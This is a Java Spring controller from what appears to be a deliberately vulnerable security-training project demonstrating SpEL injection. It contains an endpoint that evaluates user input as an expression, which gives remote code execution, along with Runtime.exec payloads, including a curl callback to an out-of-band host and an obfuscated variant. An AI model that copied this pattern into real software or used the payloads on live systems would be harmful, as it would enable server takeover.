package org.joychou.controller;

import org.junit.Test;
import org.springframework.expression.EvaluationContext;
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
//import org.springframework.expression.spel.support.SimpleEvaluationContext;


/**
 * SpEL Injection
 *
 * @author JoyChou @2019-01-17
 */
@RestController
public class SpEL {

    /**
     * SPEL to RCE
     * http://localhost:8080/spel/vul/?expression=xxx.
     * xxx is urlencode(exp)
     * exp: T(java.lang.Runtime).getRuntime().exec("curl xxx.ceye.io")
     */
    @GetMapping("/spel/vuln")
    public String rce(String expression) {
        ExpressionParser parser = new SpelExpressionParser();
        // fix method: SimpleEvaluationContext
        return parser.parseExpression(expression).getValue().toString();
    }

    @GetMapping("/spel/sec")
    public String sec(String expression) {
        // SimpleEvaluationContext was added in 4.3.15.RELEASE so the fact you can't find it in 4.3.14.RELEASE is perfectly normal.
        // ExpressionParser parser = new SimpleEvaluationContext();
        // fix method: SimpleEvaluationContext
        // return parser.parseExpression(expression).getValue().toString();
        return "test";
    }

    @Test
    public void TestSetValue() {
        ExpressionParser parser = new SpelExpressionParser();
        String s = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        // String s = "new java.lang.ProcessBuilder('ls').start()"
        Expression expression =
                parser.parseExpression(s);
        EvaluationContext context = new StandardEvaluationContext();
        context.setVariable("end", "!");
        expression.setValue(context,"end");

        //"foo".split("").getClass().newInstance("shxx-cxxopen%20/Applications/Calculator.app".split("xx"));
    }

    /*
     * expression.setValue 和 expression.getValue都可以触发表达式执行
     * */
    @Test
    public void TestGetValue() {
        ExpressionParser parser = new SpelExpressionParser();
        String s = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        // String s = "new java.lang.ProcessBuilder('ls').start()"
        // "foo".split("").getClass().newInstance("shxx-cxxopen%20/Applications/Calculator.app".split("xx"));
        Expression expression =
                parser.parseExpression(s);
        System.out.println(expression.getValue().toString());
    }

    public static void main(String[] args) {
        ExpressionParser parser = new SpelExpressionParser();
        String expression = "T(java.lang.Runtime).getRuntime().exec(\"open -a Calculator\")";
        String result = parser.parseExpression(expression).getValue().toString();
        System.out.println(result);
    }
}

